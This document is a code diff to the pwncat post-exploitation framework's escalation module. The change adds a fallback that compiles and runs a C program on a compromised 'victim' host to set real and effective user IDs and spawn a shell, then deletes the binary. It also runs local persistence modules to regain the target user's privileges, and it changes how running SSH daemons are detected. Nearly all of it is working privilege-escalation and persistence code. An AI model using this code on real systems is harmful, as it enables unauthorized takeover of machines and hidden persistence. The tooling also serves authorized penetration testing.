@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 from typing import List, Dict, Tuple
-from io import BytesIO
+from io import BytesIO, StringIO
 import dataclasses
+import textwrap
 import time
 import os
 
@@ -17,15 +18,19 @@ from pwncat.modules import (
     ArgumentFormatError,
     ModuleFailed,
 )
+from pwncat.modules.persist import PersistType, PersistModule, PersistError
 from pwncat.gtfobins import Capability
 from pwncat.file import RemoteBinaryPipe
+from pwncat.util import CompilationError
 
 
 class EscalateError(ModuleFailed):
     """ Indicates an error while attempting some escalation action """
 
 
-def fix_euid_mismatch(exit_cmd: str, target_uid: int, target_gid: int):
+def fix_euid_mismatch(
+    escalate: "EscalateModule", exit_cmd: str, target_uid: int, target_gid: int
+):
     """ Attempt to gain EUID=UID=target_uid.
 
     This is intended to fix EUID/UID mismatches after a escalation.
@@ -55,6 +60,65 @@ def fix_euid_mismatch(exit_cmd: str, target_uid: int, target_gid: int):
         if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
             return
 
+    try:
+        # Try to compile a binary
+        remote_binary = pwncat.victim.compile(
+            [
+                StringIO(
+                    textwrap.dedent(
+                        f"""
+                        #include <stdio.h>
+                        #include <unistd.h>
+                        int main() {{
+                            setreuid({target_uid}, {target_uid});
+                            setregid({target_gid}, {target_gid});
+                            execl("{pwncat.victim.shell}", "{pwncat.victim.shell}", NULL);
+                        }}
+                        """
+                    )
+                )
+            ]
+        )
+        pwncat.victim.run(remote_binary, wait=False)
+
+        # Check id again
+        new_id = pwncat.victim.id
+        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
+            pwncat.victim.run(f"rm -f {remote_binary}")
+            return
+        else:
+            pwncat.victim.run(f"rm -f {remote_binary}")
+    except CompilationError:
+        pass
+
+    for module in pwncat.modules.match("persist.*", base=PersistModule):
+        if PersistType.LOCAL not in module.TYPE:
+            continue
+
+        try:
+            module.run(
+                progress=escalate.progress,
+                user=pwncat.victim.find_user_by_id(target_uid),
+            )
+        except PersistError:
+            continue
+
+        try:
+            module.run(
+                progress=escalate.progress,
+                user=pwncat.victim.find_user_by_id(target_uid),
+                escalate=True,
+            )
+        except PersistError:
+            module.run(
+                progress=escalate.progress,
+                user=pwncat.victim.find_user_by_id(target_uid),
+                remove=True,
+            )
+            continue
+
+        return "exit\n" + exit_cmd
+
     pwncat.victim.client.send(exit_cmd.encode("utf-8"))
     pwncat.victim.flush_output()
 
@@ -64,7 +128,7 @@ def fix_euid_mismatch(exit_cmd: str, target_uid: int, target_gid: int):
 def euid_fix(technique_class):
     """
     Decorator for Technique classes which may end up with a RUID/EUID
-    mismatch. This will check the resulting UID before/after to see
+    mismatch. This will check the resulting UID after to see
     if the change was affective and attempt to fix it.
     """
 
@@ -80,7 +144,10 @@ def euid_fix(technique_class):
             # If needed fix the UID
             if ending_id["euid"]["id"] != ending_id["uid"]["id"]:
                 fix_euid_mismatch(
-                    result, ending_id["euid"]["id"], ending_id["egid"]["id"]
+                    self.module,
+                    result,
+                    ending_id["euid"]["id"],
+                    ending_id["egid"]["id"],
                 )
 
             return result
@@ -573,7 +640,6 @@ class EscalateResult(Result):
         ):
             if "sshd" in fact.data.name and fact.data.state == "running":
                 sshd = fact.data
-                break
 
         # Look for the `ssh` binary
         ssh_path = pwncat.victim.which("ssh")
